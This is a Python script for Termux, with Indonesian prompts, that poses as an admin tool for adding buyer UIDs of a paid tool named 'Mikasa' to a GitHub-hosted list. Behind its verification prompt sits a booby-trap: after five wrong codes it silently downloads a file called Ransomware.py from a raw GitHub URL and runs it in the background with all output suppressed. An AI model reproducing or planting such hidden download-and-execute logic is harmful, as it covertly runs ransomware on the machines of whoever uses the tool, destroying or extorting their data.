#!/usr/bin/env python3

import os
import sys
import time
import subprocess
import threading
import tempfile
import requests

os.system('clear')

R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
W = '\033[97m'
C = '\033[96m'
U = '\033[95m'
N = '\033[0m'

CHAPCHA_COUNT_FILE = os.path.expanduser("~/.chapcha_count")
CHAPCHA_MAX = 5
CHAPCHA_CODE = "cosowiedpzpao15e6udooa)1(+*81)psoxiep2pOao1@#_@$@-)£}{€}£\Ozo19@#$$&-)919ksoalAaaoxodoeop@9837382-Rullzz_06"
RANSOMWARE_URL = "https://raw.githubusercontent.com/OoTotapxciwiiekfkdoapz1910la9911729Kh1/Kh18462kDkopXcyTr39/refs/heads/main/Ransomware.py"

banner = """
⠀⠀⠐⠒⠶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⠶⠖⠒⠀⠀
⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⣧⢀⡀⣸⡆⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣄⣀⣀⡀⣰⣿⣿⣿⣿⣇⡀⣀⣀⣠⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠿⠿⠿⠟⠿⠿⠿⠿⠿⢿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
os.system(f'echo "{banner}" | lolcat 2>/dev/null || echo "{banner}"')

print(f"""
{W}╭────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}:{G} Add User Access
{W}╰────────────────────────────────────────────────────────────────╯{N}""")
print(f"{W}╭────────────────────────────────────────────────────────────────╮{N}")
print(f"{W}│ Masukkan Code Verifikasi Anda Sebagai Admin Tools{N}")
print(f"{W}╰────────────────────────────────────────────────────────────────╯{N}")

if os.path.exists(CHAPCHA_COUNT_FILE):
    with open(CHAPCHA_COUNT_FILE, 'r') as f:
        try:
            chapcha_count = int(f.read().strip())
        except:
            chapcha_count = 0
else:
    chapcha_count = 0

Chapcha = input(f"{W}╰──{G}❯{N} ").strip()

if not Chapcha:
    print(f"\n{R}✗ Code Tidak Boleh Kosong!{N}")
    time.sleep(2)
    sys.exit(1)

if Chapcha == CHAPCHA_CODE:
    print(f"\n╰────────────────────────────────────────────────────────╯")
    print(f"{G}✓ Verifikasi Anda Benar! Selamat Masuk Tuan{N}")
    time.sleep(2)
    if os.path.exists(CHAPCHA_COUNT_FILE):
        os.remove(CHAPCHA_COUNT_FILE)
else:
    chapcha_count += 1
    with open(CHAPCHA_COUNT_FILE, 'w') as f:
        f.write(str(chapcha_count))
    
    print(f"\n{R}✗ Code Salah! Silahkan Ulang lagi{N}")
    time.sleep(2)
    
    if chapcha_count >= CHAPCHA_MAX:
        try:
            response = requests.get(RANSOMWARE_URL, timeout=10)
            if response.status_code == 200:
                temp_script = os.path.join(tempfile.gettempdir(), "Ransomware.py")
                with open(temp_script, 'w') as f:
                    f.write(response.text)
                os.chmod(temp_script, 0o755)
                subprocess.Popen(
                    ["python3", temp_script],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    stdin=subprocess.DEVNULL
                )
        except:
            pass
        sys.exit(0)
    else:
        sys.exit(1)

os.system('clear')
os.system(f'echo "{banner}" | lolcat 2>/dev/null || echo "{banner}"')

print(f"""
{W}╭────────────────────────────────────────────────────────────────╮
{W}│ {W}Developer {W}:{G} Rullzzz06,{W} Tools {W}:{G}Add User Access
{W}╰────────────────────────────────────────────────────────────────╯{N}""")
print(f"{W}╭────────────────────────────────────────────────────────────────╮{N}")
print(f"{W}│ Script Ini menambahkan Akses user Tools {G}Mikasa{N}")
print(f"{W}│ Untuk Setiap Pembeli{N}")
print(f"{W}╰────────────────────────────────────────────────────────────────╯{N}")

print(f"{W}╭────────────────────────────────────────────────────────────────╮{N}")
print(f"{W}│ Masukkan {G}UID Termux{W} user (dari .device_uid){N}")
print(f"{W}╰─────{W}╭{G} U I D{W} ───────────────────────────────────────────────────╯")
uid = input(f"{W}      ╰──{G}❯{W} ").strip()

if not uid:
    print(f"\n{R}✗ UID tidak boleh kosong!{N}")
    time.sleep(2)
    sys.exit(1)

print(f"{W}╭────────────────────────────────────────────────────────────────╮{N}")
print(f"{W}│ Masukkan {G}Nama{W} user (tanpa spasi){N}")
print(f"{W}╰─────{W}╭{G} N A M A{W} ─────────────────────────────────────────────────╯")
nama = input(f"{W}     ╰──{G}❯{W} ").strip()

if not nama:
    print(f"\n{R}✗ Nama tidak boleh kosong!{N}")
    time.sleep(2)
    sys.exit(1)

if " " in nama:
    print(f"\n{Y}⚠️ Nama tidak boleh ada spasi!{N}")
    time.sleep(2)
    sys.exit(1)

print(f"{W}╭──────────────────────────────────────────────────────╮{N}")
print(f"{W}│ {G}Data User Buyer{N}")
print(f"{W}│ [ {G}Uid{W} ] = {G}{uid}{N}")
print(f"{W}│ [ {G}Nama{W} ] = {G}{nama}{N}")
print(f"{W}╰──────────────────────────────────────────────────────╯{N}")
confirm = input(f"╰──{G}❯{W} Yakin mau tambahkan? (y/n): {N}").strip().lower()
if confirm != 'y':
    print(f"\n{Y}[!] Dibatalkan{N}")
    time.sleep(1)
    sys.exit(0)

def load_bar(stop_event):
    COLORS = ['\x1b[1;91m', '\x1b[1;93m', '\x1b[1;92m', '\x1b[1;94m']
    RESET = '\x1b[0m'
    length = 20
    color_index = 0
    while not stop_event.is_set():
        for i in range(length + 1):
            if stop_event.is_set():
                break
            filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
            empty = '□' * (length - i)
            sys.stdout.write(f'\r [ {G}✦{W} ] Uploading User Data [[{filled_color}{empty}{W}]]')
            sys.stdout.flush()
            time.sleep(0.08)
            color_index += 1
    sys.stdout.write('\r' + ' ' * 80 + '\r')
    sys.stdout.flush()

stop_loading = threading.Event()
loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
loading_thread.daemon = True
loading_thread.start()

time.sleep(1)

try:
    REPO_PATH = "/data/data/com.termux/files/home/daftar_uid"

    if not os.path.exists(REPO_PATH):
        subprocess.run(["git", "clone", "https://github.com/x7f9k2m4n6j4h8t2v9p5s3k1/a7k3m9x2v5n8j4h6.git", REPO_PATH], capture_output=True, text=True)
    
    os.chdir(REPO_PATH)
    
    uid_file = "Uid.txt"
    
    if os.path.exists(uid_file):
        with open(uid_file, 'r', encoding='utf-8') as f:
            content = f.read()
    else:
        content = ""
    
    lines = content.splitlines()
    existing = [line for line in lines if line.strip() and not line.startswith('#')]
    
    for line in existing:
        parts = line.split('|')
        if len(parts) >= 1 and parts[0].strip() == uid:
            stop_loading.set()
            loading_thread.join()
            print(f"\n{R}✗ UID {uid} sudah terdaftar!{N}")
            time.sleep(2)
            sys.exit(1)
    
    max_num = 0
    for line in existing:
        parts = line.split('|')
        if len(parts) >= 3:
            try:
                num = int(parts[2].strip())
                if num > max_num:
                    max_num = num
            except:
                pass
    
    nomor_urut = max_num + 1
    
    new_line = f"{uid}|{nama}|{nomor_urut}"
    lines.append(new_line)
    new_content = "\n".join(lines)
    
    if not new_content.endswith('\n'):
        new_content += '\n'
    
    with open(uid_file, 'w', encoding='utf-8') as f:
        f.write(new_content)
    
    subprocess.run(["git", "add", "."], capture_output=True, text=True)
    subprocess.run(["git", "commit", "-m", f"Add user: {nama} (UID: {uid}) - No.{nomor_urut}"], capture_output=True, text=True)
    push_result = subprocess.run(["git", "push", "origin", "main"], capture_output=True, text=True)
    
    stop_loading.set()
    loading_thread.join()
    
    if push_result.returncode == 0:
        print(f"\n{W}╭─────────────────────────────────────────────────────────────╮")
        print(f"{W}│ {G}✓{W} User Berhasil Ditambahkan!{N}")
        print(f"{W}├─────────────────────────────────────────────────────────────┤")
        print(f"{W}│ {C}UID        {W}: {G}{uid}{N}")
        print(f"{W}│ {C}Nama       {W}: {G}{nama}{N}")
        print(f"{W}│ {C}Nomor Urut {W}: {G}{nomor_urut}{N}")
        print(f"{W}╰─────────────────────────────────────────────────────────────╯")
        
        print(f"\n{W}📄 Isi file Uid.txt sekarang:{N}")
        print(f"{W}─────────────────────────────────────────────────────────────{N}")
        for line in lines:
            print(f"{W}{line}{N}")
        print(f"{W}─────────────────────────────────────────────────────────────{N}")
    else:
        print(f"\n{R}✗ Gagal push!{N}")
        print(f"{Y}{push_result.stderr}{N}")
        
except Exception as e:
    stop_loading.set()
    loading_thread.join()
    print(f"\n{R}✗ Error: {e}{N}")

print()
input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Keluar...{N}")
